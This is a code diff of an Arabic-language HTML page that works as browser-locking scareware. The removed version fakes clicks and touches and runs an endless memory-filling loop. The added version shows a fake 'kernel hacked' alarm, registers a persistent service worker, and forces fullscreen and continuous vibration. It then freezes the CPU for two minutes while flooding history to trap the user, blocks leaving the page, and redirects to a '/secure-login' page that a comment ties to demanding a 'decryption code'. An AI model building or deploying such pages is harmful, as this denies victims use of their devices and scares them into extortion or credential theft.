@@ -2,66 +2,51 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>System Maintenance</title>
+    <title>FATAL ERROR 666</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; touch-action: none; cursor: none; }
-        #log { color: #0f0; font-family: monospace; padding: 20px; font-size: 12px; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none; background: url('https://i.imgur.com/eY3p5G9.gif') center/cover; }
+        .glitch { font-size: 20px; text-align: center; margin-top: 45vh; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 1px); } }
     </style>
 </head>
-<body>
-    <div id="log">Checking system integrity...<br>Status: Critical Failure</div>
+<body onclick="launchHell()">
+
+    <div id="status" class="glitch">☠️ جاري اختراق النواة... ☠️<br>انقر لتنظيف النظام</div>
+    <div id="overlay"></div>
 
     <script>
-        // 1. شل حركة المستخدم الحقيقية
-        window.addEventListener('touchstart', (e) => e.preventDefault(), {passive: false});
-
-        function startVirusSim() {
-            // 2. محاكي النقر التلقائي العنيف (Phantom Clicks)
-            // هذا الجزء يرسل آلاف النقرات وهمية للنظام في ثوانٍ
-            setInterval(() => {
-                for (let i = 0; i < 100; i++) {
-                    let x = Math.random() * window.innerWidth;
-                    let y = Math.random() * window.innerHeight;
-                    
-                    // إنشاء حدث نقر وهمي
-                    let clickEvent = new MouseEvent('click', {
-                        view: window,
-                        bubbles: true,
-                        cancelable: true,
-                        clientX: x,
-                        clientY: y
-                    });
-                    document.elementFromPoint(x, y)?.dispatchEvent(clickEvent);
-                    
-                    // محاكاة لمس (Touch) لإرباك حساسات الشاشة
-                    let touchEvent = new TouchEvent('touchstart', {
-                        bubbles: true, cancelable: true,
-                        touches: [new Touch({identifier: Date.now(), target: document.body, clientX: x, clientY: y})]
-                    });
-                    document.dispatchEvent(touchEvent);
-                }
-            }, 50);
-
-            // 3. التجميد النووي للمعالج (CPU Meltdown)
-            const crash = () => {
-                let data = "";
-                while(true) {
-                    data += Math.random().toString(36); // ملء الرام بسرعة هائلة
-                    window.history.pushState(null, null, window.location.href + "#" + Math.random());
-                    console.log("System Overflow...");
-                }
-            };
-
-            // البدء بعد ثانية واحدة من فتح الرابط
-            setTimeout(crash, 1000);
+        // تسجيل Service Worker لضمان بقاء العملية في الخلفية
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js');
         }
 
-        // تشغيل الهجوم تلقائياً
-        window.onload = () => {
-            // محاولة طلب ملء الشاشة لزيادة السيطرة
-            document.body.requestFullscreen().catch(() => {});
-            startVirusSim();
-        };
+        function launchHell() {
+            // طلب ملء الشاشة لإخفاء شريط الإشعارات
+            document.documentElement.requestFullscreen();
+            document.getElementById('status').style.display = 'none';
+            document.getElementById('overlay').style.display = 'block';
+
+            // تفعيل الهزاز (Vibration) بشكل مستمر
+            navigator.vibrate([1000, 500, 1000, 500, 2000]);
+            setInterval(() => { navigator.vibrate(2000); }, 2100);
+
+            // تجميد المعالج والرام (Nuclear Loop)
+            setTimeout(() => {
+                const start = Date.now();
+                while (Date.now() - start < 120000) { // تجميد لمدة دقيقتين كاملتين
+                    // إغراق السجل ومنع الخروج
+                    window.history.pushState(null, null, "#" + Math.random());
+                    // إجهاد المعالج
+                    for(let i=0; i<1000000; i++) { Math.sqrt(Math.random()); }
+                }
+                // بعد الدقيقتين، طلب كود فك التشفير
+                window.location.href = "/secure-login";
+            }, 1000);
+        }
+
+        // منع زر الرجوع
+        window.onbeforeunload = function() { return "System Corrupted!"; };
     </script>
 </body>
 </html>
